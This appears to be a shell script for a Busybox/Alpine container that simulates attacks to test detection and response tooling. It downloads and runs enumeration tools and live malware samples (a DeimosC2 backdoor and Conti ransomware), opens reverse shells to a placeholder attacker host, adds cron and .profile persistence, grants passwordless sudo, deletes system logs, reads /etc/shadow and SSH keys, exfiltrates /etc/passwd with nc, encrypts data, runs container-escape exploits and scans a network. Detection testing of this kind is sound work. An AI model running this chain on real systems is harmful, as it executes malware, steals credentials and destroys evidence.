#!/bin/sh
# Configured for a Busybox/Alpine container by hreed@paloaltonetworks.com
# This script simulates various malicious activities for detection and response testing.

# CONTAINER UPDATE 
# Update Alpine package manager
apk update
apk upgrade
# Network scanning tools
echo "[+] Adding Network Scanning Tools" 
apk add nmap tor socat
apk add curl
# Script execution environments
echo "[+] Adding script execution environments"
apk add busybox-extras bash python3 py3-pip

# Binary compilers and build tools
echo "[+] Adding Linux Binary Compilers"
apk add git build-base cmake libuv-dev openssl-dev hwloc-dev
apk add --no-cache gcc g++
apk add --no-cache clang llvm

# SCENARIO 1 --- Script Activity / Linux Enumeration 
# Outcome: Detect suspicious script activity
echo "Scenario 1 - Smart Enumeration Script Activity"
echo "[+] Downloading enumeration script using wget..."
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O enum_script.sh
chmod +x enum_script.sh
sleep 3

echo "[+] Executing enumeration script."
sh enum_script.sh
sleep 3

echo "[+] Downloading linpeas for further enumeration pass to pipe will activate a specific detection"
wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
sleep 3 

# SCENARIO 2 --- Local Malware 
# Outcome: download and prompt local malware analysis 
echo "Scenario 2 - Malware Protection - Wildfire Analysis"
echo "[+] Downloading Unix backdoor script"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
chmod +x 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
sleep 3

echo "[+] Creating copies in suspicious places"
cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /loader.sh
chmod +x /loader.sh

echo "[+] Creating more shadow copies" 
cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
chmod +x /bin/nonsus.sh
sleep 3 

echo "[+] Downloading Conti-C2 malware"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
sleep 3

echo "[+] Making Conti ransomware executable"
chmod +x conti.sh
sleep 3

echo "[+] Downloading C2 client"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O c2.sh
sleep 3

echo "[+] Changing C2 Client file permissions to executable" 
chmod +x c2.sh
sleep 3

# Wildfire test samples 
echo "[+] Getting http wildfire test samples"
wget http://wildfire.paloaltonetworks.com/publicapi/test/pe -O process.exe 
wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O panwelf
wget http://wildfire.paloaltonetworks.com/publicapi/test/macos -O macos


echo "[+] Getting https wildfire test samples"
wget https://wildfire.paloaltonetworks.com/publicapi/test/pe -O process1.exe 
wget https://wildfire.paloaltonetworks.com/publicapi/test/apk -O apk
wget https://wildfire.paloaltonetworks.com/publicapi/test/macos -O macos
wget https://wildfire.paloaltonetworks.com/publicapi/test/elf -O panwelf2

# SCENARIO  3 --- MITRE ATT&CK TTP Demonstration Script
echo "[+] Senario 3 MITTRE ATTACK TTP"

# === Initial Access and Execution ===
echo "[*] Attempting SSH Access..."
ssh user@localhost || echo "[!] SSH failed - Continuing..."

echo "[*] Creating reverse shell..."
bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."

# === Persistence ===
echo "[*] Adding a cron job for persistence..."
echo "* * * * * root /bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> /etc/crontabs/root

echo "[*] Adding a malicious script to .profile..."
echo "/bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> ~/.profile

# === Privilege Escalation ===
echo "[*] Modifying sudoers file for privilege escalation..."
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

echo "[*] Switching to root user..."
sudo su - || echo "[!] Failed to switch to root - Continuing..."

# === Defense Evasion ===
echo "[*] Removing log files..."
rm -rf /var/log/*

echo "[*] Changing permissions for /etc/shadow to hide from non-root users..."
chmod 600 /etc/shadow

# === Credential Access ===
echo "[*] Dumping /etc/shadow for credential access..."
cat /etc/shadow || echo "[!] Failed to read /etc/shadow - Continuing..."

echo "[*] Extracting saved credentials from .bash_history..."
cat ~/.bash_history | grep password

# === Discovery ===
echo "[*] Gathering system information..."
uname -a

echo "[*] Checking network interfaces..."
ifconfig -a

echo "[*] Listing running processes..."
ps aux -a

echo "[*] Listing contents of critical directories..."
ls -alh /etc

# === Lateral Movement ===
echo "[*] Attempting SSH to target machine..."
ssh user@target-machine || echo "[!] SSH to target failed - Continuing..."

# === Collection ===
echo "[*] Reading SSH keys..."
cat ~/.ssh/id_rsa

echo "[*] Archiving files for exfiltration..."
tar -czvf collected_data.tar.gz /etc /home

echo "[*] Creating reverse shell using netcat..."

# === Exfiltration ===
echo "[*] Exfiltrating /etc/passwd..."
cat /etc/passwd | nc [ATTACKER_IP] [PORT] || echo "[!] Exfiltration failed - Continuing..."

# === Impact ===
echo "[*] Disabling SSH service..."
service sshd stop || echo "[!] Failed to stop SSH service - Continuing..."

echo "[*] Encrypting sensitive data..."
tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in sensitive_data.tar -out sensitive_data.tar.enc -k [PASSWORD]

# Senario 4 - DEEPCE 
echo "[+] downloading conatiner enumeration and exploits"
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O deepce.sh
chmod +x deepce.sh
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
./deepce.sh --no-enumeration --exploit SOCK --shadow
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepcechmod +x deepce.sh

echo "[+] Calling malware executables"
#[TODO] Error handeling in this - nil pointer reference in go library # Execution of Malware (suppress errors with `|| true`)
#./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
./conti.sh || true 
./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 
./c2.sh 


# Senario 5 - Scanning and Discovery on network 
### Network Scanning Local 
echo "[+] Starting local scanning process"
nmap -p- 10.0.0.0/16 > localhost.txt